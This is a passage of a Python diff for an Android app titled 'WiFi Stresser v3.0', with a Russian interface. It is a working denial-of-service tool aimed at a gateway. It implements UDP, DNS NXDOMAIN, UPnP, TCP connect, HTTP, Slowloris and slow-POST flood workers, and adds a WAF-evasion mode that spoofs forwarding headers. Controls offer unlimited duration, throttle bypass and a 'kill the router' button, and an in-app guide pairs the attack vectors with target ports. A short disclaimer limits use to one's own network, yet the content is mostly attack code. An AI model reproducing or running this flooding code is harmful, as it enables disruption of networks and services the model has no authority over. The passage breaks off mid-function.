+                    fill_max_width=True
+                ),
+                ui.row([
+                    ui.text_field(
+                        value=str(self.port),
+                        on_change=lambda v: self._set_port(v),
+                        label="Порт (1-65535)",
+                        single_line=True,
+                        fill_max_width=True
+                    ),
+                    ui.text_field(
+                        value=str(self.duration),
+                        on_change=lambda v: self._set_duration(v),
+                        label="Время (сек)",
+                        single_line=True,
+                        fill_max_width=True
+                    )
+                ], spacing=8, fill_max_width=True),
+                ui.text("Быстрый выбор времени:", "bodySmall"),
+                ui.row([
+                    self._duration_chip(ui, 15, "15с"),
+                    self._duration_chip(ui, 30, "30с"),
+                    self._duration_chip(ui, 60, "60с"),
+                ], spacing=6, fill_max_width=True),
+                ui.row([
+                    self._duration_chip(ui, 120, "2 мин"),
+                    self._duration_chip(ui, 300, "5 мин"),
+                    self._duration_chip(ui, 0, "∞ Бесконечно"),
+                ], spacing=6, fill_max_width=True),
+                *slider_components,
+                ui.switch(
+                    checked=self.bypass_mode,
+                    on_change=lambda v: self._set_bypass_mode(v),
+                    title="🛡️ Режим обхода WAF / WPA3 Bypass 4.0",
+                    subtitle="Адаптивная эмуляция Transition Mode и смешанного трафика"
+                ),
+                ui.switch(
+                    checked=self.throttle_ignore,
+                    on_change=lambda v: self._set_throttle(v),
+                    title="Игнорировать троттлинг",
+                    subtitle="Максимальная производительность без микропауз"
+                )
+            ]),
+
+            # 6. Кнопка управления
+            ui.card([
+                ui.button(
+                    "🚀 Запустить stress" if not self.running else "⏹ Остановить",
+                    on_click=self._toggle_stress,
+                    style="filled" if not self.running else "error",
+                    fill_max_width=True
+                )
+            ]),
+
+            # 7. Живая статистика и прогресс
+            ui.card([
+                ui.row([
+                    ui.text("📊 Статистика", "titleSmall"),
+                    ui.text(stats_speed_text, "titleSmall")
+                ], fill_max_width=True),
+                ui.text(
+                    f"HTTP {self.stats['http']} · CON {self.stats['connect']} · "
+                    f"HOLD {self.stats['hold']} · UDP {self.stats['udp']} · UPnP {self.stats['upnp']} · "
+                    f"DNS {self.stats['dns']} · L2 {self.stats['l2']}",
+                    "bodySmall"
+                ),
+                ui.text(f"🩺 Живучесть Wi-Fi: {self.vitality_status}", "bodySmall"),
+                ui.text(timer_text, "bodyMedium"),
+                ui.wavy_progress(
+                    progress=time_progress if (self.running and self.duration > 0) else (1.0 if self.running else 0.0)
+                ),
+                ui.text(
+                    f"Активно: {self.method} ({len(self.threads)} потоков)"
+                    if self.running else "Статус: Ожидание запуска",
+                    "bodySmall"
+                )
+            ]),
+
+            # 8. Журнал событий
+            ui.card([
+                ui.row([
+                    ui.text("📋 Журнал событий", "titleSmall"),
+                    ui.button("📤 Экспорт", on_click=self._export_audit_report, style="text"),
+                    ui.button("Очистить", on_click=self._clear_logs, style="text")
+                ], fill_max_width=True),
+                ui.text(log_content, "bodySmall")
+            ]),
+
+            # 9. Кнопка супер-атаки (Рикролл)
+            ui.card([
+                ui.button(
+                    "💥 ПОЛОЖИТЬ РОУТЕР (SUPER KILLER)",
+                    on_click=self._open_rickroll,
+                    style="filled",
+                    fill_max_width=True
+                )
+            ]),
+
+            # 10. Дисклеймер
+            ui.card([
+                ui.text(
+                    "⚠️ Инструмент предназначен исключительно для аудита устойчивости собственных локальных сетей.",
+                    "bodySmall"
+                )
+            ])
+        ]
+
+        return ui.scaffold(
+            title="WiFi Stresser v3.0",
+            actions=[
+                ui.top_action("help", lambda: self.navigate("guide"))
+            ],
+            content=ui.column(children, padding=16, spacing=12)
+        )
+
+    def _method_chip(self, ui, method, available):
+        return ui.chip(
+            method,
+            selected=(self.method == method),
+            on_click=lambda: self._set_method(method) if available else None
+        )
+
+    def _duration_chip(self, ui, duration_val, label):
+        return ui.chip(
+            label,
+            selected=(self.duration == duration_val),
+            on_click=lambda: self._set_duration(duration_val)
+        )
+
+    # ------------------- Расширенный гид для новичков и профи -------------------
+
+    def screen_guide(self, ui, api, state):
+        children = [
+            ui.card([
+                ui.text("📖 Подробная База Знаний (v3.0)", "titleMedium"),
+                ui.text("Полное руководство по аудиту безопасности и стресс-тестированию роутеров", "bodySmall")
+            ]),
+
+            ui.card([
+                ui.text("🎯 1. Что такое WiFi Stresser и зачем он нужен?", "titleMedium"),
+                ui.text(
+                    "Это специализированный инструмент для проверки **отказоустойчивости и защиты локальных маршрутизаторов** (Keenetic, OpenWrt, TP-Link и др.). Он помогает понять, как шлюз реагирует на сетевой флуд, срабатывает ли встроенный Anti-DoS фильтр и не падает ли веб-интерфейс под нагрузкой.",
+                    "bodySmall"
+                )
+            ]),
+
+            ui.card([
+                ui.text("🔌 2. Как правильно выбрать порт?", "titleMedium"),
+                ui.text(
+                    "Порт определяет, какую именно службу на роутере ты будешь нагружать:\n\n"
+                    "• **Порт 80 или 443 (HTTP/HTTPS):** Веб-панель управления роутером. Используй для методов `HTTP`, `Connect`, `Hold`, `Slowloris` и `SlowBody`.\n"
+                    "• **Порт 53 (DNS):** Внутренний DNS-резолвер (`dnsmasq`). Основная цель для `UDP` и `DNS Flood`.\n"
+                    "• **Порт 1900 (UPnP):** Служба автообнаружения устройств (`miniupnpd`). Проверяет устойчивость роутера к XML-запросам.\n\n"
+                    "⚠️ *Примечание:* Современные роутеры могут скрывать порты 80/443 от сканеров безопасности. Если ты точно знаешь IP админки (например, `192.168.1.1`), просто вбей порт вручную.",
+                    "bodySmall"
+                )
+            ]),
+
+            ui.card([
+                ui.text("⚡ 3. Разбор методов атак (Векторов)", "titleMedium"),
+                ui.text(
+                    "• **UDP / DNS Flood:** Заваливают роутер мусорными пакетами и запросами несуществующих сайтов, нагружая процессор и сетевой стек.\n"
+                    "• **HTTP / Connect Flood:** Быстрый шквал подключений к веб-серверу для проверки лимита соединений.\n"
+                    "• **Slowloris / SlowBody:** Медленные атаки. Они специально удерживают сокеты открытыми, отправляя данные по одному байту в секунду, что моментально забивает лимит свободной оперативной памяти (RAM) веб-сервера.\n"
+                    "• **Mixed (Связка):** Комбинированный режим, объединяющий все выбранные векторы для комплексной проверки.\n"
+                    "• **Bypass 4.0:** Включай этот режим для аудита сетей с **WPA3 Transition Mode** — он динамически меняет заголовки, имитируя смешанный трафик SAE-авторизации.",
+                    "bodySmall"
+                )
+            ]),
+
+            ui.card([
+                ui.text("📊 4. Расшифровка метрик и отчётов", "titleMedium"),
+                ui.text(
+                    "• **PPS (Пакеты в сек):** Текущая скорость генерации трафика с телефона.\n"
+                    "• **Живучесть Wi-Fi:** Индикатор состояния связи в реальном времени (от зеленой до статуса «В коме»).\n"
+                    "• **Экспорт в JSON/CSV:** По нажатию кнопки отчеты автоматически сохраняются на телефоне в папку `/sdcard/Download/` для детального анализа.",
+                    "bodySmall"
+                )
+            ]),
+
+            ui.card([
+                ui.button(
+                    "⬅️ Вернуться назад",
+                    on_click=lambda: self.navigate("main"),
+                    style="filled",
+                    fill_max_width=True
+                )
+            ])
+        ]
+
+        return ui.scaffold(
+            title="Руководство по аудиту",
+            content=ui.column(children, padding=16, spacing=12)
+        )
+
+    def screen_report(self, ui, api, state):
+        children = [
+            ui.card([
+                ui.text("📋 Результаты аудита", "titleMedium"),
+                ui.text("Текст отчёта скопирован в буфер и сохранен в папочку Download (JSON/CSV).", "bodySmall")
+            ]),
+            ui.card([
+                ui.text_field(
+                    value=self.generated_report_text,
+                    on_change=lambda v: None,
+                    label="Отчёт",
+                    single_line=False,
+                    fill_max_width=True
+                )
+            ]),
+            ui.card([
+                ui.button(
+                    "⬅️ Вернуться назад",
+                    on_click=lambda: self.navigate("main"),
+                    style="filled",
+                    fill_max_width=True
+                )
+            ])
+        ]
+
+        return ui.scaffold(
+            title="Отчёт аудита",
+            content=ui.column(children, padding=16, spacing=12)
+        )
+
+    def screen_mixed_settings(self, ui, api, state):
+        l2_available = self.has_root or self.has_shizuku
+
+        children = [
+            ui.card([
+                ui.text("Конфигурация связки (Mixed)", "titleMedium"),
+                ui.text("Воркеры будут чередовать активные векторы атак", "bodySmall"),
+            ]),
+            ui.card([
+                ui.switch(
+                    checked=self.mixed_udp,
+                    on_change=lambda v: self._set_mixed_setting("mixed_udp", v),
+                    title="UDP Multi-Socket",
+                    subtitle="Флуд DNS NXDOMAIN / SSDP / Junk пакетами"
+                ),
+                ui.switch(
+                    checked=self.mixed_connect,
+                    on_change=lambda v: self._set_mixed_setting("mixed_connect", v),
+                    title="TCP Connect Flood",
+                    subtitle="Забивание таблицы соединений NAT"
+                ),
+                ui.switch(
+                    checked=self.mixed_http,
+                    on_change=lambda v: self._set_mixed_setting("mixed_http", v),
+                    title="HTTP Flood",
+                    subtitle="Сырой скоростной HTTP флуд с фрагментацией"
+                ),
+                ui.switch(
+                    checked=self.mixed_hold,
+                    on_change=lambda v: self._set_mixed_setting("mixed_hold", v),
+                    title="TCP Hold",
+                    subtitle="Удержание открытых сокетов шлюза"
+                ),
+                ui.switch(
+                    checked=self.mixed_slowloris,
+                    on_change=lambda v: self._set_mixed_setting("mixed_slowloris", v),
+                    title="Slowloris",
+                    subtitle="Медленная передача L7 заголовков"
+                ),
+                ui.switch(
+                    checked=self.mixed_slowbody,
+                    on_change=lambda v: self._set_mixed_setting("mixed_slowbody", v),
+                    title="SlowBody (Slow HTTP POST)",
+                    subtitle="Медленная передача тела запроса"
+                ),
+                ui.switch(
+                    checked=self.mixed_upnp,
+                    on_change=lambda v: self._set_mixed_setting("mixed_upnp", v),
+                    title="UPnP SOAP XML",
+                    subtitle="Нагрузка на демон miniupnpd парсингом XML"
+                ),
+                ui.switch(
+                    checked=self.mixed_dns,
+                    on_change=lambda v: self._set_mixed_setting("mixed_dns", v),
+                    title="DNS Flood (NXDOMAIN)",
+                    subtitle="Генерация уникальных DNS-запросов"
+                ),
+                ui.switch(
+                    checked=self.mixed_l2 and l2_available,
+                    on_change=lambda v: self._set_mixed_setting("mixed_l2", v) if l2_available else None,
+                    title="L2 Wi-Fi Scan (Root/Shizuku)",
+                    subtitle="Нагрузка на радиомодуль шлюза",
+                    enabled=l2_available
+                )
+            ]),
+            ui.card([
+                ui.button(
+                    "Сохранить и вернуться",
+                    on_click=lambda: self.navigate("main"),
+                    style="filled",
+                    fill_max_width=True
+                )
+            ]),
+            ui.card([
+                ui.text(f"✅ Выбрано TCP: {len(self._get_mixed_tcp_methods())} · UDP: {len(self._get_mixed_udp_methods())}", "bodyMedium")
+            ])
+        ]
+
+        return ui.scaffold(
+            title="Настройка Mixed",
+            content=ui.column(children, padding=16, spacing=12)
+        )
+
+    def _open_mixed_settings(self):
+        self.navigate("mixed_settings")
+
+    def _set_mixed_setting(self, key, value):
+        val = bool(value)
+        if key == "mixed_udp":
+            self.mixed_udp = val
+        elif key == "mixed_connect":
+            self.mixed_connect = val
+        elif key == "mixed_http":
+            self.mixed_http = val
+        elif key == "mixed_hold":
+            self.mixed_hold = val
+        elif key == "mixed_slowloris":
+            self.mixed_slowloris = val
+        elif key == "mixed_slowbody":
+            self.mixed_slowbody = val
+        elif key == "mixed_upnp":
+            self.mixed_upnp = val
+        elif key == "mixed_dns":
+            self.mixed_dns = val
+        elif key == "mixed_l2":
+            self.mixed_l2 = val
+        else:
+            return
+        self.set_setting(key, val)
+        self.refresh()
+
+    def _set_method(self, method):
+        if method == "L2 (Root)" and not (self.has_root or self.has_shizuku):
+            self.toast("❌ Для этого метода нужен Root или Shizuku!")
+            return
+        self.method = method
+        self.set_setting("method", method)
+        self.refresh()
+
+    def _set_gateway(self, value):
+        self.gateway = value.strip()
+        self.set_setting("gateway", self.gateway)
+
+    def _set_port(self, value):
+        try:
+            p = int(value)
+            if 1 <= p <= 65535:
+                self.port = p
+                self.set_setting("port", self.port)
+        except Exception:
+            pass
+
+    def _set_udp_threads(self, value):
+        self.udp_threads = max(16, min(1024, int(value)))
+        self.set_setting("udp_threads", self.udp_threads)
+        self.refresh()
+
+    def _set_tcp_threads(self, value):
+        self.tcp_threads = max(4, min(128, int(value)))
+        self.set_setting("tcp_threads", self.tcp_threads)
+        self.refresh()
+
+    def _set_duration(self, value):
+        try:
+            d = int(value)
+            if d >= 0:
+                self.duration = d
+                self.set_setting("duration", self.duration)
+                self.refresh()
+        except Exception:
+            pass
+
+    def _set_throttle(self, value):
+        self.throttle_ignore = bool(value)
+        self.set_setting("throttle_ignore", self.throttle_ignore)
+        self.refresh()
+
+    def _set_bypass_mode(self, value):
+        self.bypass_mode = bool(value)
+        self.set_setting("bypass_mode", self.bypass_mode)
+        self.refresh()
+
+    def _get_evasion_request_parts(self):
+        if not self.bypass_mode:
+            req = f"GET / HTTP/1.1\r\nHost: {self.gateway}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n".encode()
+            return [req]
+
+        method = random.choice(["GET", "POST", "HEAD"])
+        base_path = random.choice(HTTP_PATHS)
+        path = f"{base_path}?_nc={random.randint(10000, 99999)}&t={int(time.time())}"
+        fake_ip = f"192.168.1.{random.randint(2, 254)}"
+        ua = generate_random_user_agent()
+
+        header_pool = [
+            f"X-Forwarded-For: {fake_ip}",
+            f"Client-IP: {fake_ip}",
+            f"X-Real-IP: {fake_ip}",
+            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8",
+            "Cache-Control: no-cache, no-store, must-revalidate",
+            "Pragma: no-cache",
+            f"Cookie: session_id={os.urandom(8).hex()}",
+            "Sec-CH-UA-Mobile: ?0",
+            "Connection: close"
+        ]
+        random.shuffle(header_pool)
+
+        part1 = f"{method} {path} HTTP/1.1\r\nHost: {self.gateway}\r\nUser-Agent: {ua}\r\n".encode()
+        part2 = ("\r\n".join(header_pool) + "\r\n\r\n").encode()
+        return [part1, part2]
+
+    def _toggle_stress(self):
+        if self.running:
+            self._stop_stress()
+        else:
+            self._start_stress()
+
+    def _start_stress(self):
+        if self.running:
+            return
+
+        if self.method == "L2 (Root)" and not (self.has_root or self.has_shizuku):
+            self.toast("❌ Для L2 нужен Root или Shizuku!")
+            self._log("L2 отклонён: нет прав", "ERR")
+            return
+
+        self.running = True
+        self.stop_flag = False
+        self.time_left = self.duration
+        self.pps = 0
+        self.vitality_status = "Идет замер устойчивости..."
+        with self.stats_lock:
+            self.stats = {"http": 0, "connect": 0, "hold": 0, "udp": 0, "upnp": 0, "dns": 0, "l2": 0}
+        self.threads = []
+        self.sockets = []
+
+        dur_str = f"{self.duration} сек" if self.duration > 0 else "∞ (бесконечно)"
+        bypass_str = " [🛡️ Bypass 3.0 ON]" if self.bypass_mode else ""
+
+        threading.Thread(target=self._ui_and_timer_loop, daemon=True).start()
+        threading.Thread(target=self._vitality_monitor_loop, daemon=True).start()
+
+        if self.method == "Mixed":
+            tcp_methods = self._get_mixed_tcp_methods()
+            udp_methods = self._get_mixed_udp_methods()
+
+            if not tcp_methods and not udp_methods:
+                self.toast("❌ Выберите хотя бы одну атаку в Mixed!")
+                self._stop_stress()
+                return
+
+            self._log(f"▶️ Старт Mixed{bypass_str} (TCP-потоков: {self.tcp_threads}, UDP-потоков: {self.udp_threads}) на {self.gateway}:{self.port}", "OK")
+
+            if tcp_methods:
+                threading.Thread(target=self._spawn_workers_async, args=(self._mixed_tcp_worker, self.tcp_threads), daemon=True).start()
+            if udp_methods:
+                threading.Thread(target=self._spawn_workers_async, args=(self._mixed_udp_worker, self.udp_threads), daemon=True).start()
+
+            self.toast(f"✅ Запуск Mixed ({self.tcp_threads} TCP + {self.udp_threads} UDP)")
+        else:
+            method_map = {
+                "UDP": self._udp_worker,
+                "CONNECT": self._connect_worker,
+                "HTTP": self._http_worker,
+                "Hold": self._hold_worker,
+                "Slowloris": self._slowloris_worker,
+                "SlowBody": self._slowbody_worker,
+                "UPnP XML": self._upnp_worker,
+                "DNS Flood": self._dns_worker,
+                "L2 (Root)": self._l2_worker
+            }
+            worker = method_map.get(self.method, self._udp_worker)
+            is_tcp_single = (self.method in ["CONNECT", "HTTP", "Hold", "Slowloris", "SlowBody"])
+            threads_to_spawn = self.tcp_threads if is_tcp_single else self.udp_threads
+
+            self._log(f"▶️ Старт {self.method}{bypass_str} ({threads_to_spawn} потоков, {dur_str}) на {self.gateway}:{self.port}", "OK")
+            threading.Thread(target=self._spawn_workers_async, args=(worker, threads_to_spawn), daemon=True).start()
+            self.toast(f"✅ Запуск {self.method} ({threads_to_spawn} потоков)")
+
+        self.refresh()
+
+    def _spawn_workers_async(self, worker, target_count):
+        for i in range(target_count):
+            if self.stop_flag:
+                break
+            try:
+                t = threading.Thread(target=worker, args=(i,), daemon=True)
+                t.start()
+                self.threads.append(t)
+            except Exception as e:
+                self._record_error("ThreadSpawn", e)
+                break
+            if i % 30 == 0:
+                time.sleep(0.002)
+
+    def _stop_stress(self):
+        if not self.running and not self.stop_flag:
+            return
+        self.stop_flag = True
+        self.running = False
+        self.pps = 0
+        self._log(f"⏹ Остановка... Итог: {self.stats}", "INFO")
+
+        def cleanup_worker():
+            with self.sockets_lock:
+                for sock in list(self.sockets):
+                    self._safe_close_socket(sock)
+                self.sockets.clear()
+            self.threads.clear()
+            self._log("Все ресурсы освобождены", "OK")
+            self.refresh()
+
+        threading.Thread(target=cleanup_worker, daemon=True).start()
+        self.refresh()
+        self.toast("⏹ Остановлено")
+
+    def _udp_worker(self, idx):
+        target = (self.gateway, self.port)
+        sock = None
+
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setblocking(False)
+            with self.sockets_lock:
+                self.sockets.append(sock)
+        except Exception as e:
+            self._record_error("UDP_Init", e)
+            return
+
+        local_sent = 0
+        batch_size = 30
+
+        while not self.stop_flag:
+            try:
+                for _ in range(batch_size):
+                    if self.bypass_mode or self.port == 53:
+                        pkt = random.choice([build_random_dns_query(), JUNK_PAYLOADS[0]])
+                    else:
+                        pkt = random.choice(JUNK_PAYLOADS)
+
+                    try:
+                        sock.sendto(pkt, target)
+                        local_sent += 1
+                    except (BlockingIOError, socket.error):
+                        time.sleep(0.001)
+                        break
+
+                with self.stats_lock:
+                    self.stats["udp"] += local_sent
+                local_sent = 0
+
+                if not self.throttle_ignore:
+                    time.sleep(0.002)
+            except Exception as e:
+                if idx == 0 and random.random() < 0.05:
+                    self._record_error("UDP", e)
+                time.sleep(0.01)
+                break
+
+        if local_sent > 0:
+            with self.stats_lock:
+                self.stats["udp"] += local_sent
+
+        self._safe_close_socket(sock)
+        with self.sockets_lock:
+            if sock in self.sockets:
+                self.sockets.remove(sock)
+
+    def _dns_worker(self, idx):
+        target = (self.gateway, 53 if self.port == 80 else self.port)
+        sock = None
+
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setblocking(False)
+            with self.sockets_lock:
+                self.sockets.append(sock)
+        except Exception as e:
+            self._record_error("DNS_Init", e)
+            return
+
+        local_sent = 0
+        batch_size = 30
+
+        while not self.stop_flag:
+            try:
+                for _ in range(batch_size):
+                    pkt = build_random_dns_query()
+                    try:
+                        sock.sendto(pkt, target)
+                        local_sent += 1
+                    except (BlockingIOError, socket.error):
+                        time.sleep(0.001)
+                        break
+
+                with self.stats_lock:
+                    self.stats["dns"] += local_sent
+                local_sent = 0
+
+                if not self.throttle_ignore:
+                    time.sleep(0.002)
+            except Exception as e:
+                if idx == 0 and random.random() < 0.05:
+                    self._record_error("DNS", e)
+                time.sleep(0.01)
+                break
+
+        if local_sent > 0:
+            with self.stats_lock:
+                self.stats["dns"] += local_sent
+
+        self._safe_close_socket(sock)
+        with self.sockets_lock:
+            if sock in self.sockets:
+                self.sockets.remove(sock)
+
+    def _upnp_worker(self, idx):
+        target = (self.gateway, 1900 if self.port == 80 else self.port)
+        sock = None
+
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setblocking(False)
+            with self.sockets_lock:
+                self.sockets.append(sock)
+        except Exception as e:
+            self._record_error("UPnP_Init", e)
+            return
+
+        local_sent = 0
+        batch_size = 25
+
+        while not self.stop_flag:
+            try:
+                for _ in range(batch_size):
+                    pkt = build_upnp_soap_payload(self.gateway)
+                    try:
+                        sock.sendto(pkt, target)
+                        local_sent += 1
+                    except (BlockingIOError, socket.error):
+                        time.sleep(0.001)
+                        break
+
+                with self.stats_lock:
+                    self.stats["upnp"] += local_sent
+                local_sent = 0
+
+                if not self.throttle_ignore:
+                    time.sleep(0.002)
+            except Exception as e:
+                if idx == 0 and random.random() < 0.05:
+                    self._record_error("UPnP", e)
+                time.sleep(0.01)
+                break
+
+        if local_sent > 0:
+            with self.stats_lock:
+                self.stats["upnp"] += local_sent
+
+        self._safe_close_socket(sock)
+        with self.sockets_lock:
+            if sock in self.sockets:
+                self.sockets.remove(sock)
+
+    def _connect_worker(self, idx):
+        target = (self.gateway, self.port)
+        while not self.stop_flag:
+            sock = None
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
+                sock.connect(target)
+                parts = self._get_evasion_request_parts()
+                for p in parts:
+                    sock.send(p)
+                with self.stats_lock:
+                    self.stats["connect"] += 1
+                if not self.throttle_ignore:
+                    time.sleep(0.002)
+            except Exception as e:
+                if idx == 0 and random.random() < 0.05:
+                    self._record_error("CONNECT", e)
+            finally:
+                self._safe_close_socket(sock)
+
+    def _http_worker(self, idx):
+        target = (self.gateway, self.port)
+
+        while not self.stop_flag:
+            sock = None
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
+                sock.connect(target)
+
+                parts = self._get_evasion_request_parts()
+                for i, p in enumerate(parts):
+                    sock.sendall(p)
+                    if len(parts) > 1 and i == 0:
+                        time.sleep(0.0005)
+
+                with self.stats_lock:
+                    self.stats["http"] += 1
+                if not self.throttle_ignore:
+                    time.sleep(0.002)
+            except Exception as e:
+                if idx == 0 and random.random() < 0.05:
+                    self._record_error("HTTP", e)
+            finally:
+                self._safe_close_socket(sock)
+
+    def _hold_worker(self, idx):
+        target = (self.gateway, self.port)
+        while not self.stop_flag:
+            sock = None
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.8)
+                sock.connect(target)
+                with self.sockets_lock:
+                    self.sockets.append(sock)
+                sock.send(b"GET / HTTP/1.1\r\nHost: " + self.gateway.encode() + b"\r\n")
+                for _ in range(5):
+                    if self.stop_flag:
+                        break
+                    sock.send(f"X-k-{random.randint(1, 999)}: {random.randint(1, 999)}\r\n".encode())
+                    with self.stats_lock:
+                        self.stats["hold"] += 1
+                    time.sleep(1.0)
+            except Exception as e:
+                if idx == 0 and random.random() < 0.05:
+                    self._record_error("Hold", e)
+                time.sleep(0.5)
+            finally:
+                with self.sockets_lock:
+                    if sock in self.sockets:
+                        self.sockets.remove(sock)
+                self._safe_close_socket(sock)
+
+    def _slowloris_worker(self, idx):
+        target = (self.gateway, self.port)
+        while not self.stop_flag:
+            sock = None
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1.2)
+                sock.connect(target)
+                with self.sockets_lock:
+                    self.sockets.append(sock)
+                sock.send(b"GET / HTTP/1.1\r\nHost: " + self.gateway.encode() + b"\r\n")
+                for _ in range(10):
+                    if self.stop_flag:
+                        break
+                    hdr = f"X-a-{random.randint(1,999)}: {random.randint(1,999)}\r\n".encode()
+                    sock.send(hdr)
+                    with self.stats_lock:
+                        self.stats["hold"] += 1
+                    time.sleep(random.uniform(1.0, 2.0))
+            except Exception as e:
+                if idx == 0 and random.random() < 0.05:
+                    self._record_error("Slowloris", e)
+                time.sleep(0.5)
+            finally:
+                with self.sockets_lock:
+                    if sock in self.sockets:
+                        self.sockets.remove(sock)
+                self._safe_close_socket(sock)
+
+    def _slowbody_worker(self, idx):
+        target = (self.gateway, self.port)
+        while not self.stop_flag:
+            sock = None
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1.5)
+                sock.connect(target)
+                with self.sockets_lock:
+                    self.sockets.append(sock)
+                sock.send(b"POST /login HTTP/1.1\r\nHost: " + self.gateway.encode() + b"\r\nContent-Length: 65536\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n")
+                for _ in range(8):
+                    if self.stop_flag:
+                        break
+                    sock.send(b"chunk=1&")
+                    with self.stats_lock:
+                        self.stats["hold"] += 1
+                    time.sleep(1.0)
+            except Exception as e:
+                if idx == 0 and random.random() < 0.05:
+                    self._record_error("SlowBody", e)
+                time.sleep(0.5)
+            finally:
+                with self.sockets_lock:
+                    if sock in self.sockets:
+                        self.sockets.remove(sock)
+                self._safe_close_socket(sock)
+
+    def _mixed_tcp_worker(self, idx):
+        methods = self._get_mixed_tcp_methods()
+        if not methods:
+            return
+
+        while not self.stop_flag:
+            m = random.choice(methods)
+            m(idx)
+            time.sleep(0.005)
+
+    def _mixed_udp_worker(self, idx):
+        methods = self._get_mixed_udp_methods()
+        if not methods:
+            return
+
+        while not self.stop_flag:
+            m = random.choice(methods)
+            for _ in range(random.randint(5, 10)):
+                if self.stop_flag:
+                    return
+                m(idx)
+            time.sleep(0.002)
+
+    def _udp_once(self, idx):
+        sock = None
+        try:
+            target = (self.gateway, self.port)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setblocking(False)
+            pkt = build_random_dns_query() if self.bypass_mode else random.choice(JUNK_PAYLOADS)
+            sock.sendto(pkt, target)
+            with self.stats_lock:
+                self.stats["udp"] += 1
+        except Exception as e:
+            if idx == 0 and random.random() < 0.05:
+                self._record_error("UDP (Mixed)", e)
+        finally:
+            self._safe_close_socket(sock)
+
+    def _dns_once(self, idx):
+        sock = None
+        try:
+            target = (self.gateway, 53)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setblocking(False)
+            pkt = build_random_dns_query()
+            sock.sendto(pkt, target)
+            with self.stats_lock:
+                self.stats["dns"] += 1
+        except Exception as e:
+            if idx == 0 and random.random() < 0.05:
+                self._record_error("DNS (Mixed)", e)
+        finally:
+            self._safe_close_socket(sock)
+
+    def _upnp_once(self, idx):
+        sock = None
+        try:
+            target = (self.gateway, 1900)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setblocking(False)
+            sock.sendto(build_upnp_soap_payload(self.gateway), target)
+            with self.stats_lock:
+                self.stats["upnp"] += 1
+        except Exception as e:
+            if idx == 0 and random.random() < 0.05:
+                self._record_error("UPnP (Mixed)", e)
+        finally:
+            self._safe_close_socket(sock)
+
+    def _connect_once(self, idx):
+        sock = None
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.4)
+            sock.connect((self.gateway, self.port))
+            parts = self._get_evasion_request_parts()
+            for p in parts:
+                sock.send(p)
+            with self.stats_lock:
+                self.stats["connect"] += 1
+        except Exception as e:
+            if idx == 0 and random.random() < 0.05:
+                self._record_error("CONNECT (Mixed)", e)
+        finally:
+            self._safe_close_socket(sock)
+
+    def _http_once(self, idx):
+        sock = None
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.4)
+            sock.connect((self.gateway, self.port))
+            parts = self._get_evasion_request_parts()
+            for p in parts:
+                sock.sendall(p)
+            with self.stats_lock:
+                self.stats["http"] += 1
+        except Exception as e:
+            if idx == 0 and random.random() < 0.05:
+                self._record_error("HTTP (Mixed)", e)
+        finally:
+            self._safe_close_socket(sock)
+
+    def _hold_once(self, idx):
+        sock = None
+        try:
+            target = (self.gateway, self.port)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.6)
+            sock.connect(target)
+            with self.sockets_lock:
+                self.sockets.append(sock)
+            sock.send(b"GET / HTTP/1.1\r\nHost: " + self.gateway.encode() + b"\r\n")
+            sock.send(b"X-keep: 1\r\n")
+            time.sleep(0.5)
+            with self.stats_lock:
+                self.stats["hold"] += 1
+        except Exception as e:
+            if idx == 0 and random.random() < 0.05:
+                self._record_error("Hold (Mixed)", e)
+        finally:
+            with self.sockets_lock:
+                if sock in self.sockets:
+                    self.sockets.remove(sock)
+            self._safe_close_socket(sock)
+
+    def _slowloris_once(self, idx):
+        sock = None
+        try:
+            target = (self.gateway, self.port)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.6)
+            sock.connect(target)
+            with self.sockets_lock:
+                self.sockets.append(sock)
+            sock.send(b"GET / HTTP/1.1\r\nHost: " + self.gateway.encode() + b"\r\n")
+            for _ in range(3):
+                if self.stop_flag:
+                    break
+                sock.send(f"X-b-{random.randint(1,99)}: a\r\n".encode())
+                time.sleep(0.4)
+            with self.stats_lock:
+                self.stats["hold"] += 1
+        except Exception as e:
+            if idx == 0 and random.random() < 0.05:
+                self._record_error("Slowloris (Mixed)", e)
+        finally:
+            with self.sockets_lock:
+                if sock in self.sockets:
+                    self.sockets.remove(sock)
+            self._safe_close_socket(sock)
+
+    def _slowbody_once(self, idx):
+        sock = None
+        try:
+            target = (self.gateway, self.port)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.6)
+            sock.connect(target)
+            with self.sockets_lock:
+                self.sockets.append(sock)
+            sock.send(b"POST /login HTTP/1.1\r\nHost: " + self.gateway.encode() + b"\r\nContent-Length: 1024\r\n\r\n")
+            sock.send(b"data=1")
+            time.sleep(0.4)
+            with self.stats_lock:
+                self.stats["hold"] += 1
+        except Exception as e:
+            if idx == 0 and random.random() < 0.05:
+                self._record_error("SlowBody (Mixed)", e)
+        finally:
+            with self.sockets_lock:
+                if sock in self.sockets:
+                    self.sockets.remove(sock)
+            self._safe_close_socket(sock)
+
+    def _l2_once(self, idx):
+        now = time.time()
+        if now - self._last_l2_time < 1.5:
+            return
+        self._last_l2_time = now
+
+        try:
